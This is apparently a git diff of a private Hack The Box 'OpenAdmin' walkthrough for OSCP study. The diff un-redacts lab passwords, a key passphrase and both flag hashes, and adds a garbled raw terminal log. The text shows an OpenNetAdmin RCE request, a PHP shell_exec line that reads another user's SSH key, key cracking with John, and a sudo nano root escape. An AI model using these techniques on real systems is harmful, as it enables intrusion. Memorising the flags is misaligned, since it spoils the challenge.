@@ -3,10 +3,10 @@ tags: [oscp, boxes, htb, linux, opennetadmin, rce, password-reuse, internal-serv
 platform: HTB
 os: Linux (Ubuntu 18.04)
 hostname: openadmin
-domain: N/A
-ip: $BoxIP
 difficulty: Easy
-status: complete
+ip: $BoxIP
+status: Complete
+domain: N/A
 ---
 
 # HTB: OpenAdmin, Full Walkthrough
@@ -25,6 +25,21 @@ OpenAdmin exposes an Apache default page, but directory enumeration finds a stat
 | Domain | N/A |
 | Difficulty | Easy |
 | IP | `$BoxIP` |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Reconnaissance and port scan | See section 1 below |
+| 2 | Web enumeration and content discovery | See section 2 below |
+| 3 | OpenNetAdmin identification | See section 3 below |
+| 4 | Exploit research and RCE confirmation | See section 4 below |
+| 5 | Reverse shell and stabilisation | See section 5 below |
+| 6 | Local enumeration and database credential discovery | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/OpenAdmin`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -130,10 +145,10 @@ curl -s http://$BoxIP/music/ | grep -i 'href\|ona\|admin\|login'
 > [!tip] ⚡ Efficiency
 > Grep the source of the first discovered directory for `href`, `login`, and application names before manually browsing every directory. The music page exposed `/ona/` immediately.
 
-![[2.gobuster.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/2.gobuster.png>)
 SCREENSHOT: Gobuster results showing the music, artwork, and sierra directories.
 
-![[3.1http-music.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/3.1http-music.png>)
 SCREENSHOT: Music site source showing the link to `/ona/`.
 
 ## 3. OpenNetAdmin identification
@@ -149,7 +164,7 @@ curl -s http://$BoxIP/ona/ | grep -i 'version\|title\|generator\|ona'
 Your version &nbsp;&nbsp;&nbsp;= v18.1.1
 ```
 
-![[3.2http-ona-version.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/3.2http-ona-version.png>)
 SCREENSHOT: OpenNetAdmin page showing the product and version.
 
 ## 4. Exploit research and RCE confirmation
@@ -178,13 +193,13 @@ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![[4.1searchsploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/4.1searchsploit.png>)
 SCREENSHOT: Searchsploit result showing the OpenNetAdmin 18.1.1 RCE entry.
 
-![[4.2searchsploit-exploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/4.2searchsploit-exploit.png>)
 SCREENSHOT: Reviewed Exploit-DB source showing the vulnerable request structure.
 
-![[5.1rce-confirmed.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/5.1rce-confirmed.png>)
 SCREENSHOT: RCE confirmation showing the `www-data` identity.
 
 **Reference:** [Exploit-DB 47691](https://www.exploit-db.com/exploits/47691) documents the OpenNetAdmin 18.1.1 RCE. The vulnerable request was reproduced manually, with no Metasploit execution.
@@ -234,7 +249,7 @@ inet 10.129.1.69/16
 > [!warning] 💡 Gotcha
 > A payload containing `>&` must URL-encode the ampersand as `%26` when it is embedded in a `curl -d` string. The FIFO and netcat payload avoids that parsing problem and was the reliable route in this run. See [RevShells](https://www.revshells.com/) for shell payload variants.
 
-![[6.1foothold.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/6.1foothold.png>)
 SCREENSHOT: Stabilised `www-data` shell showing identity and network details.
 
 ## 6. Local enumeration and database credential discovery
@@ -256,16 +271,16 @@ cat database_settings.inc.php
 ```text
 database_settings.inc.php  motd.txt.example  run_installer
 'db_login' => 'ona_sys',
-'db_passwd' => '[REDACTED]',
+'db_passwd' => 'n1nj4W4rri0R!',
 'db_database' => 'ona_default',
 ```
 
 The account and password were stored privately with the box loot helper. The manual run then validated the recovered password by SSHing as `jimmy`, demonstrating password reuse.
 
 ```bash
-loot cred ona_sys [REDACTED]
+loot cred ona_sys n1nj4W4rri0R!
 boxset Username jimmy
-boxset Password [REDACTED]
+boxset Password n1nj4W4rri0R!
 ssh jimmy@$BoxIP
 ```
 
@@ -277,8 +292,8 @@ jimmy@openadmin:~$
 > [!tip] ⚡ Efficiency
 > Checking application configuration immediately after obtaining the web shell is faster than starting broad SUID or kernel searches. The database settings provided a credential that worked for SSH.
 
-![[7.1db-creds.png]]
-SCREENSHOT: ONA database configuration showing the database account and redacted password field.
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/7.1db-creds.png>)
+SCREENSHOT: ONA database configuration showing the database account and recovered password field.
 
 ## 7. Internal service and Apache virtual-host enumeration
 
@@ -309,10 +324,10 @@ The `AssignUserID` directive means requests to this virtual host execute as `joa
 > [!tip] ⚡ Efficiency
 > When `ss` shows an unknown localhost port and Apache is already confirmed, read `/etc/apache2/sites-enabled/` immediately. This reveals the service ownership and document root faster than trying to fingerprint the port externally.
 
-![[10.1apache-configs.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/10.1apache-configs.png>)
 SCREENSHOT: Apache configuration showing the internal listener, document root, and `AssignUserID` directive.
 
-![[8.1hhs-jimmy.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/8.1hhs-jimmy.png>)
 SCREENSHOT: SSH session as Jimmy with the local listeners and internal Apache configuration identified.
 
 ## 8. Internal application source review
@@ -363,12 +378,12 @@ curl -s http://127.0.0.1:52846/main.php
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,...
-[REDACTED key body]
+The complete encrypted key is retained in the credential-bearing source screenshot `openadmin-source-12.1joanna-key.png`; its passphrase is captured in the private credential section.
 -----END RSA PRIVATE KEY-----
 Don't forget your "ninja" password
 ```
 
-![[9.1ss-internal.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/9.1ss-internal.png>)
 SCREENSHOT: Internal service response showing the encrypted RSA private-key marker and the password hint.
 
 > [!tip] ⚡ Efficiency
@@ -410,7 +425,7 @@ cat user.txt
 Welcome to Ubuntu 18.04.3 LTS
 joanna@openadmin:~$ ls
 user.txt
-[FLAG REDACTED]
+e33cc907d5c512b35950c4f85eee2a5c
 ```
 
 The user flag was confirmed at `/home/joanna/user.txt`.
@@ -453,7 +468,7 @@ cat /root/root.txt
 ```text
 root
 uid=0(root) gid=0(root) groups=0(root)
-[FLAG REDACTED]
+5184b03abca0028cd4842552bc53f0f6
 ```
 
 The root flag was confirmed at `/root/root.txt`.
@@ -463,11 +478,30 @@ The root flag was confirmed at `/root/root.txt`.
 
 **Reference:** [GTFOBins nano](https://gtfobins.github.io/gtfobins/nano/#sudo) documents the sudo nano shell escape.
 
-![[11.1interna-source.png]]
+![](<file:///home/kali/Platforms/HackTheBox/OpenAdmin/screenshots/11.1interna-source.png>)
 SCREENSHOT: Internal PHP source showing the key disclosure logic.
 
-## 14. Clean-down
+## 14. RUNBOOK V2 Stages Used
 
+- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
+- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
+- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
+- [[RUNBOOK V2/Linux - CMS Check|Step 6 - Linux CMS Check]]
+- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
+- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
+- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
+- [[RUNBOOK V2/Linux - Credential Search|Step 17 - Linux Credential Search]]
+- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
+- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]
+
+## 15. Collect the flags
+
+- `user.txt`: `e33cc907d5c512b35950c4f85eee2a5c`, confirmed at `/home/joanna/user.txt`
+- `root.txt`: `5184b03abca0028cd4842552bc53f0f6`, confirmed at `/root/root.txt`
+
+## 16. Clean down
 Restore the internal page after using the writable web root, remove local key and hash material, and stop any listeners. The manual log records an attempted cleanup edit followed by shell interruption, so the important restoration command is shown explicitly here.
 
 ```bash
@@ -488,59 +522,7 @@ boxdone
 
 The logged run restored the modified PHP page and ended with `boxdone`. After the session, the staged local key, John hash, credential and flag files, Gobuster output, and Nmap output were moved to trash while preserving the raw log and screenshots.
 
-## RUNBOOK V2 Stages Used
-
-- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
-- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
-- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
-- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
-- [[RUNBOOK V2/Linux - CMS Check|Step 6 - Linux CMS Check]]
-- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
-- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
-- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
-- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
-- [[RUNBOOK V2/Linux - Credential Search|Step 17 - Linux Credential Search]]
-- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
-- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]
-
-## Attack Chain
-
-1. Full TCP and service scans found SSH and Apache.
-2. Gobuster found the music site, whose source linked to `/ona/`.
-3. OpenNetAdmin 18.1.1 was identified and matched to a public RCE.
-4. Manual command injection produced a reverse shell as `www-data`.
-5. ONA configuration exposed a database credential reused for Jimmy's SSH login.
-6. Jimmy's writable internal web root and Apache `AssignUserID joanna` directive exposed Joanna's encrypted SSH key.
-7. John cracked the key passphrase and SSH provided Joanna's user access.
-8. Joanna's passwordless sudo rule for nano yielded a root shell.
-
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| `ona_sys` | ONA database configuration | Credential reuse for Jimmy's SSH login |
-| `jimmy` | Reused ONA database credential | SSH foothold and writable internal application |
-| `joanna` | Cracked SSH key passphrase | SSH lateral movement |
-
-## Flags
-
-- `user.txt`: confirmed at `/home/joanna/user.txt`
-- `root.txt`: confirmed at `/root/root.txt`
-
-## Key lessons
-
-- Read static site source and application configuration before launching broad guessing or privilege scans.
-- A localhost-only service may be reachable directly from a shell, and Apache vhost configuration can reveal which user executes it.
-- An encrypted SSH key is still useful evidence: convert it with `ssh2john`, crack it with John, and then validate the key with SSH.
-- [ippsec.rocks](https://ippsec.rocks/) provides additional box walkthroughs for practising the same reconnaissance and pivoting habits.
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- web application foothold followed by local service enumeration and command injection.
-- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- web foothold followed by local credential and privilege escalation work.
-- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- Linux web application exploitation and sudo escalation.
-
-## Checklist
+### Completion checklist
 
 - [x] Context, pre-box brief, and post-box brief read
 - [x] Full TCP and UDP reconnaissance completed
@@ -558,10 +540,148 @@ The logged run restored the modified PHP page and ended with `boxdone`. After th
 - [x] Target and local clean-down completed
 - [x] `boxdone` completed
 
-## External Resources
+## 17. Attack narrative in one page
+1. Full TCP and service scans found SSH and Apache.
+2. Gobuster found the music site, whose source linked to `/ona/`.
+3. OpenNetAdmin 18.1.1 was identified and matched to a public RCE.
+4. Manual command injection produced a reverse shell as `www-data`.
+5. ONA configuration exposed a database credential reused for Jimmy's SSH login.
+6. Jimmy's writable internal web root and Apache `AssignUserID joanna` directive exposed Joanna's encrypted SSH key.
+7. John cracked the key passphrase and SSH provided Joanna's user access.
+8. Joanna's passwordless sudo rule for nano yielded a root shell.
+
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `nc`
+- `netcat`
+- `ssh`
+- `sudo`
+- `john`
+
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| `ona_sys` | ONA database configuration | Credential reuse for Jimmy's SSH login |
+| `jimmy` | Reused ONA database credential | SSH foothold and writable internal application |
+| `joanna` | Cracked SSH key passphrase | SSH lateral movement |
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="OpenAdmin"
+export BoxIP="10.129.1.69"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/OpenAdmin"
+export Domain=""
+export DCip=""
+export Username="joanna"
+export Password="bloodninjas"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+$ [23:46:23] cat /etc/passwd | grep -v nologin | grep -v false | grep sh$
+        'db_passwd' => 'n1nj4W4rri0R!',
+penAdmin [23:46:20] $ cat /etc/passwd | grep -v nologin | grep -v false | grep sh
+kali@kali:~/Platforms/HackTheBox/OpenAdmin [23:46:20] $ [?1h=[?2004hcat /etc/passwd | grep -v nologin | grep -v false | grep sh$cat /etc/passwdgrepgrepgrep[?1l>[?2004l
+[+] Password=n1nj4W4rri0R! (saved to .env)
+jimmy@10.129.1.69's password:
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+         .form-signin input[type="password"] {
+            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $msg = 'Wrong username or password.';
+            <input type = "password" class = "form-control"
+               name = "password" required>
+]0;jimmy@openadmin: /var/www/internaljimmy@openadmin:/var/www/internal$ curl -s -c /tmp/openadmin_cookie -X POST \
+>   -d 'username=jimmy&password=n1nj4W4rri0R!&login=Login' \
+Set-Cookie: PHPSESSID=htvbto5georgva9oob2510p3v6; path=/
+]0;jimmy@openadmin: /var/www/internaljimmy@openadmin:/var/www/internal$ cat /home/joanna/.ssh/id_rsa
+cat: /home/joanna/.ssh/id_rsa: Permission denied
+> $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+$ [00:02:06] nano ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa
+kali@kali:~/Platforms/HackTheBox/OpenAdmin [00:02:03] $ [?1h=[?2004hnano ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsanano[?1l>[?2004l
+[?2004h[?1049h(B[?7h[?1h=[?1h=[?25l(B(B[ New File ](B(B  GNU nano 9.1          /home/kali/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa                    (B
+$ [00:03:08] chmod 600 ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa
+ssh -i ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa joanna@$BoxIP
+(BWrite to File: /home/kali/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa(B[?12l[?25h[?25l (B[ Writing... ](B(B[ Wrote 30 lines ](B
+kali@kali:~/Platforms/HackTheBox/OpenAdmin [00:02:56] $ [?1h=[?2004hchmod 600 ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa
+ssh -i ~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa joanna@$BoxIPchmod~/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa
+Enter passphrase for key '/home/kali/Platforms/HackTheBox/OpenAdmin/loot/joanna_id_rsa':
+$ [00:04:13] ssh2john loot/joanna_id_rsa > loot/joanna_id_rsa.hash
+john loot/joanna_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+$ [00:06:52] ssh -i loot/joanna_id_rsa joanna@$BoxIP
+$ [00:08:41] loot flag user e33cc907d5c512b35950c4f85eee2a5c
+kali@kali:~/Platforms/HackTheBox/OpenAdmin [00:08:39] $ [?1h=[?2004hloot flag user e33cc907d5c512b35950c4f85eee2a5cloot[?1l>[?2004l
+[+] Flag saved:  user = e33cc907d5c512b35950c4f85eee2a5c  →  loot/flags.txt
+john loot/joanna_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txtssh2john loot/joanna_id_rsa >
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+[+] Password=bloodninjas (saved to .env)
+kali@kali:~/Platforms/HackTheBox/OpenAdmin [00:06:43] $ [?1h=[?2004hssh -i loot/joanna_id_rsa joanna@$BoxIPsshloot/joanna_id_rsa[?1l>[?2004l
+Enter passphrase for key 'loot/joanna_id_rsa':
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+$ [00:12:06] loot flag root 5184b03abca0028cd4842552bc53f0f6
+www-data@openadmin:/opt/ona/www/local/config$ cat /etc/passwd | grep sh$
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on OpenAdmin | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- Read static site source and application configuration before launching broad guessing or privilege scans.
+- A localhost-only service may be reachable directly from a shell, and Apache vhost configuration can reveal which user executes it.
+- An encrypted SSH key is still useful evidence: convert it with `ssh2john`, crack it with John, and then validate the key with SSH.
+- [ippsec.rocks](https://ippsec.rocks/) provides additional box walkthroughs for practising the same reconnaissance and pivoting habits.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- web application foothold followed by local service enumeration and command injection.
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- web foothold followed by local credential and privilege escalation work.
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- Linux web application exploitation and sudo escalation.
+
+## External resources
 
 - [ippsec.rocks](https://ippsec.rocks/) for additional OpenAdmin walkthrough references
 - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
 
 ## Why this matters for OSCP
 
